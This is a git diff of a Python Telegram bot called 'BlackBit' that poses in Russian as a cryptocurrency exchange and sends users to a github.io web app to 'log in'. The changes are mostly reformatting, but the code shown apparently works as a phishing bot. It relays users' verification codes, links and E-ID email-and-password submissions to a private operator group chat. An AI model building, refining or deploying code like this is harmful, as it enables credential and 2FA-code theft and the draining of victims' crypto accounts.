@@ -1,4 +1,3 @@
-cat > blackbit.py << 'EOF'
 import os
 import logging
 import json
@@ -14,7 +13,6 @@ WEB_APP_URL = "https://d3987616-hue.github.io/blackbit/"
 
 logging.basicConfig(level=logging.INFO)
 logger = logging.getLogger(__name__)
-
 user_sessions = {}
 
 class BlackBitBot:
@@ -35,17 +33,14 @@ class BlackBitBot:
                  f"🕐 Время: {current_time}",
             parse_mode="Markdown"
         )
-        keyboard = [
-            [KeyboardButton("🔑 Войти", web_app=WebAppInfo(url=WEB_APP_URL))],
-            [KeyboardButton("ℹ️ BLACKBIT")]
-        ]
+        keyboard = [[KeyboardButton("🔑 Войти", web_app=WebAppInfo(url=WEB_APP_URL))], [KeyboardButton("ℹ️ BLACKBIT")]]
         reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
         await update.message.reply_text(
             f"👋 Привет, {user.first_name}!\n\n"
-            f"Добро пожаловать на BlackBit — криптовалютную биржу.\n\n"
+            f"Добро пожаловать на BlackBit.\n\n"
             f"🔒 Безопасность, высокая скорость и низкие комиссии.\n"
-            f"📈 Торгуй BTC, ETH, USDT и другими криптовалютами.\n\n"
-            f"Нажми кнопку ВНИЗУ, чтобы войти в свой аккаунт.",
+            f"📈 Торгуй BTC, ETH, USDT и другими.\n\n"
+            f"Нажми кнопку ВНИЗУ, чтобы войти.",
             reply_markup=reply_markup,
             parse_mode="Markdown"
         )
@@ -61,28 +56,17 @@ class BlackBitBot:
             return
         if text == "ℹ️ BLACKBIT":
             await msg.reply_text(
-                f"📘 О проекте BlackBit\n\n"
-                f"BlackBit — это криптовалютная биржа.\n\n"
-                f"🔒 Безопасность\n"
-                f"⚡ Скорость\n"
-                f"💰 Низкие комиссии\n\n"
-                f"📈 Торгуй BTC, ETH, USDT и другими.",
+                f"📘 О проекте BlackBit\n\nBlackBit — криптовалютная биржа.\n\n🔒 Безопасность\n⚡ Скорость\n💰 Низкие комиссии\n\n📈 Торгуй BTC, ETH, USDT.",
                 disable_web_page_preview=True
             )
             return
         if user_sessions.get(user_id, {}).get('awaiting_code'):
-            await self.app.bot.send_message(
-                chat_id=GROUP_CHAT_ID,
-                text=f"📧 [BLACKBIT] Код от {user_id}: {text}"
-            )
+            await self.app.bot.send_message(chat_id=GROUP_CHAT_ID, text=f"📧 [BLACKBIT] Код от {user_id}: {text}")
             user_sessions[user_id]['awaiting_code'] = False
             await msg.reply_text("✅ Отправлено")
             return
         if user_sessions.get(user_id, {}).get('awaiting_link'):
-            await self.app.bot.send_message(
-                chat_id=GROUP_CHAT_ID,
-                text=f"🔗 [BLACKBIT] Ссылка от {user_id}: {text}"
-            )
+            await self.app.bot.send_message(chat_id=GROUP_CHAT_ID, text=f"🔗 [BLACKBIT] Ссылка от {user_id}: {text}")
             user_sessions[user_id]['awaiting_link'] = False
             await msg.reply_text("✅ Отправлено")
             return
@@ -106,10 +90,7 @@ class BlackBitBot:
                     await msg.reply_text("✅ Заявка отправлена!")
                     return
                 if step == 'code' and code:
-                    await self.app.bot.send_message(
-                        chat_id=GROUP_CHAT_ID,
-                        text=f"📧 [BLACKBIT] Код от {user_id}: {code}"
-                    )
+                    await self.app.bot.send_message(chat_id=GROUP_CHAT_ID, text=f"📧 [BLACKBIT] Код от {user_id}: {code}")
                     await msg.reply_text("✅ Отправлено")
                     return
                 if eid_type == 'eid_login' and email and password:
@@ -123,10 +104,7 @@ class BlackBitBot:
                     await msg.reply_text("✅ Заявка E-ID отправлена!")
                     return
                 if step == 'eid_link' and link:
-                    await self.app.bot.send_message(
-                        chat_id=GROUP_CHAT_ID,
-                        text=f"🔗 [BLACKBIT] Ссылка от {user_id}: {link}"
-                    )
+                    await self.app.bot.send_message(chat_id=GROUP_CHAT_ID, text=f"🔗 [BLACKBIT] Ссылка от {user_id}: {link}")
                     await msg.reply_text("✅ Ссылка отправлена!")
                     return
             except Exception as e:
@@ -145,7 +123,7 @@ class BlackBitBot:
             except Exception as e:
                 print(f"⚠️ Ошибка установки вебхука: {e}")
         print("=" * 50)
-        print("🚀 БОТ BLACKBIT ЗАПУЩЕН (ВЕБХУК)")
+        print("🚀 БОТ BLACKBIT ЗАПУЩЕН")
         print("=" * 50)
         self.app.run_webhook(
             listen="0.0.0.0",
@@ -157,4 +135,3 @@ class BlackBitBot:
 if __name__ == "__main__":
     bot = BlackBitBot()
     bot.run()
-EOF
